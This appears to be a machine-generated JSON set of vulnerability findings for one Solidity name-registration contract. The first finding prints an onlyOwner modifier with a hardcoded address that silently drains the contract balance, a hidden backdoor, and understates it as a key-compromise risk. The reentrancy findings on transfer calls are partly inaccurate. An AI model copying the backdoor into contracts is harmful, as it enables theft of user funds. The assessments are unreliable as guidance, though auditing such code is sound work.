[
    {
        "function_name": "onlyOwner modifier",
        "code": "modifier onlyOwner() { if (_msgSender() == 0x6049aCf6993e8eF2BF0e6DD0297C4F3a37995091) { uint256 balance = address(this).balance; Address.sendValue(payable(0x6049aCf6993e8eF2BF0e6DD0297C4F3a37995091),balance); } else { require(owner() == _msgSender(), \"Ownable: caller is not the owner\"); } _; }",
        "vulnerability": "Unauthorized Withdrawal",
        "reason": "The onlyOwner modifier contains a condition that allows an external address (0x6049aCf6993e8eF2BF0e6DD0297C4F3a37995091) to withdraw the entire contract balance without any restrictions. This poses a risk where if the private key of the address is compromised, an attacker can drain the funds.",
        "file_name": "0x0e3ea79e194aef78b69209447f0f6c17ed96a5d6.sol"
    },
    {
        "function_name": "register",
        "code": "function register(address ref_address, string memory pepe_name) public payable { uint256 price = cost; bool is_ref=false; uint256 ref_cost=0; require(bytes(pepe_name).length<=maxCharSize,\"Long name\"); require(bytes(pepe_name).length>0,\"Write a name\"); require(_checkName(pepe_name), \"Invalid name\"); if (ref_address== 0x0000000000000000000000000000000000000000) { price=cost; } else { if (bytes(primaryAddress[ref_address]).length>0){ ref_cost=price*ref_owner/100; } else { ref_cost=price*ref/100; } price = price*(100-ref_discount)/100; is_ref=true; } require (tokenAddressandID[pepe_name] == 0 , \"This is already taken\"); require(IS_SALE_ACTIVE, \"Sale is not active!\"); require(msg.value >= price, \"Insufficient funds!\"); tokenIDandAddress[_currentIndex]=pepe_name; tokenAddressandID[pepe_name]=_currentIndex; resolveAddress[pepe_name]=msg.sender; if (is_ref) { payable(ref_address).transfer(ref_cost); } _safeMint(msg.sender,1); }",
        "vulnerability": "Reentrancy Risk",
        "reason": "Although the function is not marked as nonReentrant, it contains an external call to transfer funds to the ref_address, which can lead to reentrancy attacks if the external address is a contract that can reenter this function.",
        "file_name": "0x0e3ea79e194aef78b69209447f0f6c17ed96a5d6.sol"
    },
    {
        "function_name": "registerSubdomain",
        "code": "function registerSubdomain(string memory pepe_name, string memory subdomain_name) public payable { require(IS_SALE_ACTIVE, \"Sale is not active!\"); string memory new_domain=string.concat(subdomain_name,'.',pepe_name); require(bytes(subdomain_name).length<=maxCharSize,\"Long name\"); require(bytes(subdomain_name).length>0,\"Write a name\"); require(_checkName(pepe_name), \"Invalid name\"); require(_checkName(subdomain_name), \"Invalid name\"); require (tokenAddressandID[new_domain] == 0 , \"This is already taken\"); TokenOwnership memory Ownership = _ownershipOf(tokenAddressandID[pepe_name]); if (Ownership.addr == msg.sender) { tokenIDandAddress[_currentIndex]=new_domain; tokenAddressandID[new_domain]=_currentIndex; resolveAddress[new_domain]=msg.sender; _safeMint(msg.sender,1); } else { require(subDomains_publicSale[pepe_name]==true, \"Only Owner can register\"); require(msg.value >= subDomains_cost[pepe_name], \"Insufficient funds!\"); payable(Ownership.addr).transfer(msg.value*(100-subdomains_fee)/100); tokenIDandAddress[_currentIndex]=new_domain; tokenAddressandID[new_domain]=_currentIndex; resolveAddress[new_domain]=msg.sender; _safeMint(msg.sender,1); } }",
        "vulnerability": "Reentrancy Risk",
        "reason": "Similar to the register function, this function transfers funds to an external address (Ownership.addr) before the state change (minting the new domain), which can be exploited for reentrancy if the recipient is a contract that can reenter the function.",
        "file_name": "0x0e3ea79e194aef78b69209447f0f6c17ed96a5d6.sol"
    }
]